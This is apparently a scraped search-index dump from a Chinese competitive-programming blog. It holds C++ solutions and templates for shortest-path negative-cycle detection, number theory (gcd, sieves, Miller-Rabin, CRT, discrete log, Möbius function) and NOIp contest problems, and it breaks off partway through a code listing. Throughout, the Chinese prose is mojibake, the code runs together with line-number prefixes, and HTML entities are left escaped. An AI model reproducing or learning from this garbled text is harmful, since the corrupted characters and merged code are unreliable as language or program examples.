·,ä»$A$å’Œ$B$ä¸­å„ä»»å–ä¸€ä¸ªæ•°ç›¸åŠ å¾—åˆ°$n^2$ä¸ªå’Œ,å¯ä»¥æŠŠè¿™äº›å’Œçœ‹æˆå½¢æˆäº†$n$ä¸ªé˜Ÿåˆ—: 1234a[1] + b[1] &lt;= a[1] + b[2] &lt;= ... &lt;= a[1] + B[n]a[2] + b[1] &lt;= a[2] + b[2] &lt;= ... &lt;= a[2] + B[n] ... ... ... ...a[n] + b[1] &lt;= a[n] + b[2] &lt;= ... &lt;= a[n] + B[n] æ¥ä¸‹æ¥,å°†è¿™$n$ä¸ªé˜Ÿåˆ—è¿›è¡Œåˆå¹¶: å°†è¿™$n$ä¸ªé˜Ÿåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ”¾å…¥ä¼˜å…ˆé˜Ÿåˆ—ä¸­ï¼› æ¯æ¬¡å–å‡ºä¼˜å…ˆé˜Ÿåˆ—ä¸­çš„æœ€å°å€¼,è‹¥è¿™ä¸ªæœ€å°å€¼æ¥è‡ªäºç¬¬$k$ä¸ªé˜Ÿåˆ—,é‚£ä¹ˆ,å°±å°†ç¬¬$k$ä¸ªé˜Ÿåˆ—çš„ä¸‹ä¸€ä¸ªå…ƒç´ æ”¾å…¥ä¼˜å…ˆé˜Ÿåˆ—ä¸­ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç»“æ„ä½“æ¥è®°å½•é˜Ÿåˆ—ä¸­ä¸€ä¸ªèŠ‚ç‚¹çš„å€¼val,é˜Ÿåˆ—å·id,ä¸‹ä¸€ä¸ªå…ƒç´ nxt ä»£ç 1234567891011121314151617181920212223242526272829303132#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 100010;struct Node { int val, id, nxt; Node(int v, int i, int n): val(v), id(i), nxt(n) {}};bool operator &lt; (const Node&amp; a, const Node&amp; b) { return a.val &gt; b.val;}int n, a[maxn], b[maxn];priority_queue&lt;Node&gt; q;int main() { scanf(&quot;%d&quot;, &amp;n); for (int i = 0; i &lt; n; ++i) scanf(&quot;%d&quot;, &amp;a[i]); for (int i = 0; i &lt; n; ++i) scanf(&quot;%d&quot;, &amp;b[i]); for (int i = 0; i &lt; n; ++i) { q.push(Node( a[i] + b[0], i, 1 )); } for (int i = 0; i &lt; n; ++i) { Node t = q.top(); q.pop(); printf(&quot;%d &quot;, t.val); q.push(Node( a[t.id] + b[t.nxt], t.id, t.nxt + 1 )); } return 0;}/* 402ms 3196kB */ $\\mathcal{ã€ŒP2850ã€}$ è™«æ´æ€è·¯åˆ¤æ–­__è´Ÿç¯__çš„æ¨¡æ¿é¢˜ æ¯æ¡å°è·¯è¿æ¥è¾¹æƒä¸ºæ­£çš„æ— å‘è¾¹,æ¯ä¸ªè™«æ´è¿æ¥è¾¹æƒä¸ºè´Ÿçš„æ— å‘è¾¹å­˜åœ¨è´Ÿç¯,åˆ™å¯ä»¥å›åˆ°è¿‡å»ä½¿ç”¨$SPFA$ç®—æ³•åˆ¤æ–­è´Ÿç¯($Floyd$ä¹Ÿå¯ä»¥,ä½†ä¸å¼€O2ä¼˜åŒ–ä¼š$TLE$) $SPFA$åˆ¤æ–­è´Ÿç¯:å¦‚æœä»»æ„ä¸€æ¡è¾¹è¢«ä¿®æ”¹å¤§äº$n$æ¬¡,è¿™ä¸ªå›¾å†…ä¸€å®šå­˜åœ¨è‡³å°‘ä¸€ä¸ªè´Ÿç¯ ä»£ç ä½¿ç”¨vectorå»ºè¾¹,é‚»æ¥è¡¨ä¹Ÿå¯ä»¥ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0, f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 510;struct Edge { int from, to, val; Edge(int u, int v, int w): from(u), to(v), val(w) {}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v, int w) { edges.push_back(Edge(u, v, w)); int mm = edges.size(); G[u].push_back(mm - 1);}int dist[maxn], vis[maxn], cnt[maxn];int n, m, w;bool SPFA(int s) { queue&lt;int&gt; q; q.push(s); dist[s] = 0; vis[s] = 1; while (!q.empty()) { int u = q.front(); q.pop(); vis[u] = 0; for (int i = 0; i &lt; G[u].size(); ++i) { Edge&amp; e = edges[G[u][i]]; if (dist[e.to] &gt; dist[u] + e.val) { dist[e.to] = dist[u] + e.val; if (!vis[e.to]) { vis[e.to] = 1; q.push(e.to); cnt[e.to]++; //ç»Ÿè®¡ä¿®æ”¹æ¬¡æ•° } if (cnt[e.to] &gt; n) { //ä¿®æ”¹å¤§äºnæ¬¡ return true; //å­˜åœ¨è´Ÿç¯ } } } } return false;}void clear() { edges.clear(); for (int i = 0; i &lt; maxn - 5; ++i) { G[i].clear(); } memset(cnt, 0, sizeof(cnt)); memset(vis, 0, sizeof(vis)); memset(dist, 0x7f, sizeof(dist));}int main() { int T = read(); while (T--) { clear(); n = read(); m = read(); w = read(); for (int i = 0; i &lt; m; ++i) { int u = read(), v = read(), d = read(); add(u, v, d); add(v, u, d); } for (int i = 0; i &lt; w; ++i) { int u = read(), v = read(), d = read(); add(u, v, -d); } if (SPFA(1)) { printf(&quot;YES\\n&quot;); } else { printf(&quot;NO\\n&quot;); } } return 0;}/* 164ms 1024kB */ å¦‚æœ‰ç–‘é—®,å¯ä»¥åœ¨ä¸‹æ–¹è¯„è®ºåŒºç•™è¨€","link":"/p/1faf5003.html"},{"title":"ç®—æ³•ç¬”è®°-æ•°è®º","text":"æ¨¡æ¿åœ°å€: GitHub æ¬§å‡ é‡Œå¾—ç®—æ³•(Euclid algorithm)123LL gcd(LL a, LL b) { return b == 0 ? a : gcd(b, a % b);} lcm(a, b) = a / gcd(a, b) * b æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•(exGCD)ç›®æ ‡: å¯»æ‰¾ä¸€å¯¹æ•´æ•°$(x, y)$,ä½¿$ax+by=gcd(a,b)$ 1234void exgcd(LL a, LL b, LL&amp; d, LL&amp; x, LL&amp; y) { if (!b) { d = a; x = 1; y = 0; } //dä¸ºgcd(a, b) else { exgcd(b, a % b, d, y, x); y -= x * (a / b); }} è£´èœ€å®šç†$ax+by=c$ä¸”$x,y$å…¨ä¸ºæ­£æ•´æ•°,åˆ™å½“ä¸”ä»…å½“$gcd(a, b)|c$ ç´ æ•°ç›¸å…³Eratosthenesç­›æ³•1234567891011bool vis[maxn];int prime[maxn];void getprime(int n) { int m = (int)sqrt(n + 0.5), num = 0; memset(vis, 0, sizeof(vis)); vis[0] = vis[1] = 1; for (int i = 2; i &lt;= m; ++i) if (!vis[i]) { prime[++num] = i; for (int j = i * i; j &lt;= n; j += i) vis[j] = 1; }} æ¬§æ‹‰çº¿æ€§ç­›12345678910111213void getprime(int n) { vis[1] = true; for (int i = 2; i &lt;= n; i++) { if (!vis[i]) { prime[++cnt] = i; } for (int j = 1; j &lt;= cnt; j++) { int v = i * prime[j]; if (v &gt; n) break; vis[v] = true; } }} ç´ æ•°å®šç†$$\\pi(x) \\sim \\frac{x}{\\ln x}$$ $Miller-Rabin$ç´ æ•°æµ‹è¯•åŸç†:è´¹é©¬å°å®šç†è‹¥$a^{n-1}\\equiv 1\\pmod n$,$a$å–å€¼è¶Šå¤š,å¯ä»¥è¿‘ä¼¼è®¤ä¸º$n$ä¸ºè´¨æ•°ä½¿ç”¨äºŒæ¬¡æ¢æµ‹å®šç†æ”¹è¿›å¡å¡è¿ˆå°”æ•°(åˆæ•°$n$å¯¹äºä»»ä½•æ­£æ•´æ•°$b$,éƒ½æ»¡è¶³$gcd(b, n)=1\\ \\ b^{n-1}\\equiv 1\\pmod n$)çš„bug 123456789101112131415161718LL Random(LL n) { return (LL)((double)rand() / RAND_MAX * n + 0.5); }bool Witness(LL a, LL n) { LL m = n - 1; int j = 0; while (!(m &amp; 1)) { j++; m &gt;&gt;= 1; } LL x = pow_mod(a, m, n); if (x == 1 || x == n - 1) return false; while (j--) { x = x * x % n; if (x == n - 1) return false; } return true;}bool Miller_Rabin(LL n) { if (n &lt; 2) return false; if (n == 2) return true; if (!(n &amp; 1)) return false; for (int i = 1; i &lt;= 30; ++i) { LL a = Random(n - 2) + 1; if (Witness(a, n)) return false; } return true;} æ¨¡ç®—æœ¯$$(a + b)\\bmod n = ((a\\bmod n) + (b\\bmod n))\\bmod n\\\\(a - b)\\bmod n = ((a\\bmod n) - (b\\bmod n) + n)\\bmod n\\\\ab\\mod n = (a\\bmod n)(b\\bmod n)\\bmod n$$ å¿«é€Ÿä¹˜ $ab\\bmod n$123456789LL mul_mod(LL a, LL b, LL n){ LL res = 0; while (b &gt; 0) { if (b &amp; 1) res = (res + a) % n; a = (a + a) % n; b &gt;&gt;= 1; } return res;} å¿«é€Ÿå¹‚ $a^p\\bmod n$1234567LL pow_mod(LL a, LL p, LL n) { if (p == 0 &amp;&amp; n == 1) return 0; if (p == 0) return 1; LL ans = pow_mod(a, p / 2, n); ans = ans * ans % n; if (p % 2 == 1) ans = ans * a % n; return ans;} ä½¿ç”¨ä½è¿ç®—: 12345LL pow_mod(LL a, LL p, LL n) { a %= n; LL ans = 1; for (; p; p &gt;&gt;= 1, a *= a, a %= n) if(p &amp; 1) ans = ans * a % n; return ans;} æ¬§æ‹‰$\\varphi$å‡½æ•°$$\\varphi(n)=n(1-\\frac{1}{p_1})(1-\\frac{1}{p_2})â€¦(1-\\frac{1}{p_k})$$$\\varphi(n)$è¡¨ç¤ºä¸è¶…è¿‡$n$ä¸”ä¸$n$äº’è´¨çš„æ•´æ•°ä¸ªæ•° æ±‚å€¼123456789int euler_phi(int n) { int m = (int)sqrt(n + 0.5); int ans = n; for (int i = 2; i &lt;= m; ++i) if (n % i == 0) { ans = ans / i * (i - 1); while (n % i == 0) n /= i; } if (n &gt; 1) ans = ans / n * (n - 1); return ans;} ç­›æ¬§æ‹‰å‡½æ•°è¡¨123456789int phi[maxn];void phi_table(int n) { for (int i = 2; i &lt;= n; ++i) phi[i] = 0; phi[1] = 1; for (int i = 2; i &lt;= n; ++i) if (!phi[i]) for (int j = i; j &lt;= n; j += i) { if (!phi[j]) phi[j] = j; phi[j] = phi[j] / i * (i - 1); }} åŒä½™å¼å®šç†æ¬§æ‹‰å®šç†è‹¥$gcd(a, n) = 1$,åˆ™$a^{\\varphi(n)}\\equiv 1\\pmod n$ è´¹é©¬å°å®šç†è‹¥$p$ä¸ºè´¨æ•°,åˆ™$a^{p-1}\\equiv 1\\pmod p$ å¨å°”é€Šå®šç†è‹¥$p$ä¸ºè´¨æ•°,åˆ™$(p-1)!\\equiv -1\\pmod p$ ä¹˜æ³•é€†å…ƒ$$a\\div b\\bmod n = a\\times b^{-1}\\bmod n$$$b^{-1}$ç§°ä¸º$b$åœ¨æ¨¡$n$æ„ä¹‰ä¸‹çš„é€†å…ƒ $n$ä¸ºè´¨æ•°ä½¿ç”¨è´¹é©¬å°å®šç†, $a^{-1} = a^{n - 2}$ $n$ä¸ä¸ºè´¨æ•°é€’å½’æ±‚è§£ 12345LL inv(LL a, LL n) { LL d, x, y; exgcd(a, n, d, x, y); return d == 1 ? (x + n) % n : -1;} ç­›é€†å…ƒè¡¨1234567int inv_table[maxn];void getinv(int n, int p) { inv_table[1] = 1; for (int i = 2; i &lt;= n; ++i) { inv_table[i] = (LL)(p - p / i) * inv_table[p % i] % p; }} åŒä½™æ–¹ç¨‹$ax\\equiv b\\pmod n$å¯ä»¥åŒ–ä¸º$ax+ny=b$ä½¿ç”¨æ‰©å±•æ¬§æ‹‰å®šç†è§£å†³ ä¸­å›½å‰©ä½™å®šç†(China Remainder Theorem)æ±‚è§£$x\\equiv a_i\\pmod {m_i}$æ»¡è¶³$m_i$ä¸¤ä¸¤äº’è´¨ 12345678910LL crt(int n, int* a, int* m) { LL M = 1, d, y, x = 0; for (int i = 0; i &lt; n; ++i) M *= m[i]; for (int i = 0; i &lt; n; ++i) { LL w = M / m[i]; exgcd(m[i], w, d, d, y); x = (x + y * w * a[i]) % M; } return (x + M) % M;} æ‰©å±•ä¸­å›½å‰©ä½™å®šç†(exCRT)$m_i$ä¸ä¸€å®šä¸¤ä¸¤äº’è´¨ 12345678910111213LL excrt(LL n, LL* a, LL* m) { LL x, y, k, M = m[0], ans = a[0]; for (int i = 1; i &lt; n; ++i) { LL A = M, B = m[i], C = (a[i] - ans % B + B) % B, gcd; exgcd(A, B, gcd, x, y); LL bg = B / gcd; if (C % gcd != 0) return -1; x = mul_mod(x, C / gcd, bg); ans += x * M; M *= bg; ans = (ans % M + M) % M; } return (ans % M + M) % M;} ç¦»æ•£å¯¹æ•°(BSGS)æ±‚è§£$a^x\\equiv b\\pmod n$æ»¡è¶³$n$ä¸ºè´¨æ•° 12345678910111213141516int log_mod(int a, int b, int n) { int m, v, e = 1, i; m = (int)sqrt(n + 0.5); v = inv(pow_mod(a, m, n), n); map&lt;int, int&gt; x; x[1] = 0; for (i = 1; i &lt; m; ++i) { e = mul_mod(e, a, n); if (!x.count(e)) x[e] = i; } for (i = 0; i &lt; m; ++i) { if (x.count(b)) return i * m + x[b]; b = mul_mod(b, v, n); } return -1;} è«æ¯”ä¹Œæ–¯åæ¼”æ•´é™¤åˆ†å—æ•´é™¤åˆ†å—å¯ä»¥å¯¹åé¢çš„è«æ¯”ä¹Œæ–¯åæ¼”æä¾›å¾ˆå¤§çš„ä¼˜åŒ–é€šè¿‡æšä¸¾å¯ä»¥å‘ç°$\\lfloor \\frac{n}{i} \\rfloor$çš„ç»“æœä¼šå‡ºç°åˆ†å—ç°è±¡ä¾‹å¦‚$n=10$æ—¶$\\ \\ \\ i\\ \\ \\ \\ 1\\ \\ 2\\ 3\\ 4\\ 5\\ 6\\ 7\\ 8\\ 9\\ 10\\ 11\\ 12\\ 13\\ â€¦$$\\lfloor \\frac{n}{i} \\rfloor\\ 10\\ 5\\ 3\\ 2\\ 2\\ 1\\ 1\\ 1\\ 1\\ 1\\ \\ \\ 0\\ \\ \\ 0\\ \\ \\ 0\\ \\ \\ â€¦$ä¸éš¾å‘ç°,æ¯ä¸ªå—çš„å³ç«¯ç‚¹ä¸º$r=\\lfloor \\frac{n}{t}\\rfloor (t=\\lfloor \\frac{n}{i}\\rfloor)$ è«æ¯”ä¹Œæ–¯å‡½æ•°$$\\mu(n) =\\begin{cases}1, &amp; n=1 \\\\(-1)^r, &amp; n=p_1p_2p_3â€¦p_r(\\text{$p_i$ä¸ºäº’ä¸ç›¸åŒçš„è´¨æ•°}) \\\\0, &amp; else\\end{cases}$$æ€§è´¨:$$\\sum_{d|n}{\\mu(d)}=[n=1]$$$$\\sum_{d|n}{\\frac{\\mu(d)}{d}}=\\frac{\\varphi(n)}{n}$$çº¿æ€§ç­›: 123456789101112131415int mu[maxn], vis[maxn];int primes[maxn], cnt;void get_mu(int n) { memset(vis, 0, sizeof(vis)); memset(mu, 0, sizeof(mu)); cnt = 0; mu[1] = 1; for (int i = 2; i &lt;= n; ++i) { if (!vis[i]) { primes[cnt++] = i; mu[i] = -1; } for (int j = 0; j &lt; cnt &amp;&amp; primes[j] * i &lt;= n; ++j) { vis[primes[j] * i] = 1; if (i % primes[j] == 0)break; mu[i * primes[j]] = -mu[i]; } }}","link":"/p/da9a11f.html"},{"title":"ã€ŒLuogu P1516ã€é’è›™çš„çº¦ä¼š-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P1516ã€é’è›™çš„çº¦ä¼š é¢˜ç›®å¤§æ„(è§„å®šçº¬åº¦çº¿ä¸Šä¸œç»0åº¦å¤„ä¸ºåŸç‚¹ï¼Œç”±ä¸œå¾€è¥¿ä¸ºæ­£æ–¹å‘ï¼Œå•ä½é•¿åº¦1ç±³ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€æ¡é¦–å°¾ç›¸æ¥çš„æ•°è½´)ç°æœ‰ä¸¤åªé’è›™$A,B$è®¾é’è›™$A$çš„å‡ºå‘ç‚¹åæ ‡æ˜¯$x$ï¼Œé’è›™$B$çš„å‡ºå‘ç‚¹åæ ‡æ˜¯$y$é’è›™$A$ä¸€æ¬¡èƒ½è·³$m$ç±³ï¼Œé’è›™$B$ä¸€æ¬¡èƒ½è·³$n$ç±³ï¼Œä¸¤åªé’è›™è·³ä¸€æ¬¡æ‰€èŠ±è´¹çš„æ—¶é—´ç›¸åŒçº¬åº¦çº¿æ€»é•¿$l$ç±³æ±‚ä¸¤åªé’è›™è·³äº†å‡ æ¬¡ä»¥åæ‰ä¼šç¢°é¢ é¢˜è§£__åŒä½™æ–¹ç¨‹__æ¨¡æ¿é¢˜æ±‚è§£$x + km\\equiv y + kn \\pmod l$ $Solve:$$$x+kmâˆ’(y+kn)=lz,\\ \\ z\\in Z\\\\(x-y)+k(m-n)-lz=0\\\\k(n-m)+lz=(x-y)$$ä»¤$a=x-y,b=n-m$ä¸Šå¼å¯åŒ–ä¸º:$$kb+lz=a$$æ±‚è¿™ä¸ªæ–¹ç¨‹çš„æœ€å°æ•´æ•°è§£åŒ–ä¸ºæ±‚æ­¤ä¸å®šæ–¹ç¨‹æœ€å°æ•´æ•°è§£$$kâ€™b+lzâ€™=gcd(b,l)$$ä½¿ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•å¯å¾—ä¸€ç»„ç‰¹è§£$(kâ€™,bâ€™)$æœ€å°è§£ä¸º$k_{min} = kâ€™\\bmod \\frac{l}{gcd(b,l)}$ä»¥ä¸Šè§£$k_{min}$çš„æ–¹ç¨‹å³è¾¹æ˜¯$gcd(b,l)$è€Œä¸æ˜¯$a$æ‰€ä»¥ç»“æœä¸º$$\\boxed{ (kâ€™\\times \\frac{a}{gcd(b,l)})\\bmod \\frac{l}{gcd(b,l)} }$$ ä»£ç 123456789101112131415161718192021222324#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long LL;void exgcd(LL a, LL b, LL&amp; d, LL&amp; x, LL&amp; y) { if (!b) { d = a; x = 1; y = 0; } else { exgcd(b, a % b, d, y, x); y -= x * (a / b); }}int main() { LL n, m, x, y, l, gcd, x1, y1; scanf(&quot;%lld %lld %lld %lld %lld&quot;, &amp;x, &amp;y, &amp;m, &amp;n, &amp;l); LL b = n - m, a = x - y; if (b &lt; 0) { b = -b, a = -a; } exgcd(b, l, gcd, x1, y1); if (a % gcd) { printf(&quot;Impossible\\n&quot;); } else { LL ans = ((x1 * (a / gcd)) % (l / gcd) + (l / gcd)) % (l / gcd); printf(&quot;%lld\\n&quot;, ans); } return 0;}/* 26ms 916kB */","link":"/p/1f4bfad8.html"},{"title":"ã€ŒNOIp2016ã€é¢˜è§£","text":"$???$å°±ä¸€é“ç´«é¢˜$???$,è¿˜æ˜¯$D1T2\\ ???$ $D1T1$ ç©å…·è¿·é¢˜ç®€å•çš„__æ¨¡æ‹Ÿ__,æ²¡çš„è¯´ ä»£ç 123456789101112131415161718192021222324252627#include &lt;bits/stdc++.h&gt;using namespace std;struct Node{ int towards; string name;} a[100001];int n, m, ai, si;int main() { cin &gt;&gt; n &gt;&gt; m; for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; a[i].towards &gt;&gt; a[i].name; } int peo = 0; for (int i = 1; i &lt;= m; ++i) { cin &gt;&gt; ai &gt;&gt; si; if (ai == 0 &amp;&amp; a[peo].towards == 0) peo = (peo + n - si) % n; else if (ai == 0 &amp;&amp; a[peo].towards == 1) peo = (peo + si) % n; else if (ai == 1 &amp;&amp; a[peo].towards == 0) peo = (peo + si) % n; else if (ai == 1 &amp;&amp; a[peo].towards == 1) peo = (peo + n - si) % n; } cout &lt;&lt; a[peo].name &lt;&lt; endl; return 0;} /* 430ms 4760kB */","link":"/p/2a6e5fce.html"},{"title":"ã€ŒNOIp2017ã€é¢˜è§£","text":"NOIp2017çš„é¢˜æ¯”NOIp2018çš„é¢˜å¥½åšä¸€ç‚¹ $D1T1$ å°å‡¯çš„ç–‘æƒ‘é¢˜è§£æ¨æŸ¿å­(æ­£ç¡®æ€§æœªçŸ¥)è®¾$a &lt; b$ ç­”æ¡ˆä¸º$x$æ‰€ä»¥:$$x \\equiv ma \\pmod b (1 \\leq m \\leq b - 1)$$å³$x = ma + nb (1 \\leq m \\leq b - 1)$æ˜¾ç„¶å½“$ n \\geq 0$æ—¶ $x$å¯ä»¥ç”¨$a, b$è¡¨ç¤ºå‡ºæ¥ï¼Œä¸åˆé¢˜æ„å› æ­¤å½“$n = -1$æ—¶$x$å–å¾—æœ€å¤§å€¼ï¼Œæ­¤æ—¶$x = ma - b$æ˜¾ç„¶å½“$m$å–å¾—æœ€å¤§å€¼$b - 1$æ—¶$x$æœ€å¤§ï¼Œæ­¤æ—¶$x = (b - 1)a - b = ab - a - b$å› æ­¤$a, b$æ‰€è¡¨ç¤ºä¸å‡ºçš„æœ€å¤§çš„æ•°æ˜¯$$\\boxed{ab - a - b}$$ ä»£ç 1234567891011#include &lt;bits/stdc++.h&gt;using namespace std;long long a, b;int main() { scanf(&quot;%lld %lld&quot;, &amp;a, &amp;b); printf(&quot;%lld\\n&quot;, a * b - a - b); return 0;}/* 60ms 948kB */ $D1T2$ æ—¶é—´å¤æ‚åº¦æ¯’ç˜¤å¤§æ¨¡æ‹Ÿæ²¡ä»€ä¹ˆå¥½è¯´çš„,ç›´æ¥ä¸Šä»£ç  ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;bits/stdc++.h&gt;using namespace std;string str1, str2; int cal, O, NumOfLoop, vis[27], var[27], Onow, Kill, AddO[100], Omax, WhereKill, T;int main() { cin &gt;&gt; T; while (T &gt; 0) { T--; cal = 0; O = 0; Omax = 0; WhereKill = 0; NumOfLoop = 0; Onow = 0; Kill = 0; memset(vis, 0, sizeof(vis)); memset(AddO, 0, sizeof(AddO)); do { str1 = str2; cin &gt;&gt; str2; } while(str2[0] != 'O'); for (int i = 0; i &lt; str1.length(); i++) cal = cal * 10 + str1[i] - '0'; for (int i = 4; i &lt; str2.length() - 1; i++) O = O * 10 + str2[i] - '0'; while (cal &gt; 0) { cal--; cin &gt;&gt; str1; if (str1[0] == 'F') { NumOfLoop++; cin &gt;&gt; str1; if (vis[str1[0] - 96]) { NumOfLoop = -1; } else { vis[str1[0] - 96] = 1; var[NumOfLoop] = str1[0] - 96; } cin &gt;&gt; str1 &gt;&gt; str2; if (str1[0] != 'n' &amp;&amp; str2[0] == 'n' &amp;&amp; Kill == 0) { Onow++; AddO[NumOfLoop] = 1; } else if (((str1.length() == str2.length() &amp;&amp; str1 &gt; str2) || (str1.length() &gt; str2.length()) || (str1[0] == 'n' &amp;&amp; str2[0] != 'n')) &amp;&amp; Kill == 0) { Kill = 1; WhereKill = NumOfLoop; } } else { Omax = max(Omax, Onow); vis[var[NumOfLoop]] = 0; if (AddO[NumOfLoop] == 1) { Onow--; AddO[NumOfLoop] = 0; } NumOfLoop--; if (WhereKill &gt; 0 &amp;&amp; NumOfLoop &lt; WhereKill) { Kill = 0; WhereKill = 0; } } if(NumOfLoop == -1) { printf(&quot;ERR\\n&quot;); cal = -1; } } if (NumOfLoop &gt; 0) printf(&quot;ERR\\n&quot;); if (NumOfLoop == 0 &amp;&amp; Omax == O) printf(&quot;Yes\\n&quot;); if (NumOfLoop == 0 &amp;&amp; Omax != O) printf(&quot;No\\n&quot;); } return 0;}/* 34ms 756kB */ $D1T3$ é€›å…¬å›­æœ¬é¢˜æ€è·¯æ¥è‡ªå®‰å¦®007çš„é¢˜è§£ é¢˜è§£ å…ˆSPFAæ±‚æœ€çŸ­è·¯ å†åå‘SPFAæ’é™¤æ— æ³•åˆ°è¾¾çš„è¾¹ å†è®°å¿†åŒ–æœç´¢èµ°å†¤æ‰è·¯çš„æœ€ä¼˜æ–¹æ¡ˆ è¯¦ç»†è§å®‰å¦®007çš„é¢˜è§£ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#include &lt;bits/stdc++.h&gt;using namespace std;const int inf = 0x7fffffff;const int maxn = 100010;struct Node { int x, y; Node(int x, int y): x(x), y(y) {}};int n, m, k, p, T;vector&lt;Node&gt; v[maxn], s[maxn];int d[maxn], ans[maxn][60];bool vis[maxn][60], alive[maxn];queue&lt;int&gt; q, f;int dfs(int a, int b) { //aå½“å‰ç‚¹,bå…è®¸èµ°çš„å†¤æ‰è·¯é•¿åº¦ if (b &lt; 0) { return 0; } else if (vis[a][b] == 1) { //åˆå›æ¥äº† return -inf; //æ— ç©·å¤šç§(-infç”¨äºåˆ¤æ–­) } else if (ans[a][b] != -1) { //ç®—è¿‡äº† return ans[a][b]; } else { vis[a][b] = true; int key = 0; if (a == n) { //åˆ°ç›®çš„åœ° key++; } for (int i = 0; i &lt; v[a].size(); ++i) { int g = v[a][i].x, y = v[a][i].y; //gæœ¬æ¡è¾¹ç»ˆç‚¹,yæƒå€¼ int u = d[g] - d[a]; if (alive[g] == 0) { //ä¸èƒ½åˆ°ç»ˆç‚¹ continue; } int w = dfs(g, b - (y - u)); if (w == -inf) { return -inf; } else { key = (key + w) % p; } } ans[a][b] = key % p; vis[a][b] = false; //å›æº¯ return key; }}void safe() { //æ’é™¤æ— æ³•åˆ°ç»ˆç‚¹çš„ç‚¹(åå‘SPFA) f.push(n); alive[n] = 1; //ç‚¹nè‡ªèº«å¯ä»¥åˆ°è¾¾ while (!f.empty()) { int h = f.front(); f.pop(); for (int i = 0; i &lt; s[h].size(); ++i) { int g = s[h][i].x; if (alive[g] == 0) { alive[g] = 1; f.push(g); } } } return ;}void spfa() { //SPFAæ±‚æœ€çŸ­è·¯ q.push(1); d[1] = 0; while (!q.empty()) { int h = q.front(); q.pop(); for (int i = 0; i &lt; v[h].size(); ++i) { int g = v[h][i].x, y = v[h][i].y; if (d[h] + y &lt; d[g]) { d[g] = d[h] + y; q.push(g); } } } return ;}int main() { scanf(&quot;%d&quot;, &amp;T); while (T--) { scanf(&quot;%d %d %d %d&quot;, &amp;n, &amp;m, &amp;k, &amp;p); for (int i = 1; i &lt;= n; ++i) { v[i].clear(); s[i].clear(); alive[i] = 0; for (int j = 0; j &lt;= k; ++j) { ans[i][j] = -1; vis[i][j] = 0; } } for (int i = 0; i &lt; m; ++i) { int a, b, c; scanf(&quot;%d %d %d&quot;, &amp;a, &amp;b, &amp;c); v[a].push_back(Node(b, c)); //æ­£å‘è¾¹ s[b].push_back(Node(a, c)); //åå‘è¾¹ } for (int i = 2; i &lt;= n; ++i) { d[i] = inf; } spfa(); //SPFAæ±‚æœ€çŸ­è·¯ safe(); int z = dfs(1, k); if (z == -inf) { printf(&quot;-1\\n&quot;); } else { printf(&quot;%d\\n&quot;, z); } } return 0;}/* 6488ms 44632kB with O2 */ $D2T1$ å¥¶é…ªé¢˜è§£æ²¡ä»€ä¹ˆå¥½è¯´çš„,ç›´æ¥__æœç´¢__å­˜å¥½æ¯ä¸ªç‚¹,æ’åº,ä»ä¸‹å‘ä¸Šæœ ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 1010;bool fini = false, vis[maxn];int T, n, h, r;struct Node { double x, y, z;} node[maxn];bool cmp(Node a, Node b) { return a.z &gt; b.z;}double dist(Node a, Node b) { return sqrt(pow(a.x - b.x, 2) + pow(a.y - b.y, 2) + pow(a.z - b.z, 2));}void dfs(Node now, int num) { if (now.z + r &gt;= h) { fini = true; return; } vis[num] = true; for (int i = 1; i &lt;= n; ++i) { if (fini) { return; } else if (!vis[i] &amp;&amp; dist(node[i], now) &lt;= r * 2) { dfs(node[i], i); } }}int main() { scanf(&quot;%d&quot;, &amp;T); while (T--) { fini = false; memset(node, 0, sizeof(node)); memset(vis, 0, sizeof(vis)); scanf(&quot;%d %d %d&quot;, &amp;n, &amp;h, &amp;r); for (int i = 1; i &lt;= n; ++i) { scanf(&quot;%lf %lf %lf&quot;, &amp;node[i].x, &amp;node[i].y, &amp;node[i].z); } sort(node + 1, node + 1 + n, cmp); for (int i = 1; i &lt;= n; ++i) { if (node[i].z - r &lt;= 0) { dfs(node[i], i); } } printf(fini ? &quot;Yes\\n&quot; : &quot;No\\n&quot;); } return 0;}/* 157ms 832kB */ $D2T2$ å®è—é¢˜è§£çŠ¶å‹?? æ¨¡æ‹Ÿé€€ç«?? ä¸å­˜åœ¨çš„ è’Ÿè’»ä¸ä¼š__æœç´¢+å‰ªæ__èƒ½å¾ˆå¿«ACæ‰è¿™é“ç´«é¢˜ä¸è§£é‡Šäº† ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;bits/stdc++.h&gt;using namespace std;const int inf = 0x3f3f3f3f;int vis[20], dis[20], num[20]; //å·²è®¿é—®çš„ç‚¹,è·1çš„è·ç¦»,å¯ä»¥åˆ°è¾¾çš„ç‚¹æ•°int c[20][20], G[20][20]; //è´¹ç”¨,å›¾int ans = inf, tmp, tot, cnt, n, m, p;bool cmp(int a, int b) { return c[p][a] &lt; c[p][b];}void dfs(int u, int node) { for (int i = u; i &lt;= cnt; ++i) { if(tot + tmp * dis[vis[i]] &gt;= ans) return; for (int j = node; j &lt;= num[vis[i]]; ++j) { if(!dis[G[vis[i]][j]]) { cnt++; vis[cnt] = G[vis[i]][j]; tmp -= c[vis[cnt]][G[vis[cnt]][1]]; tot += 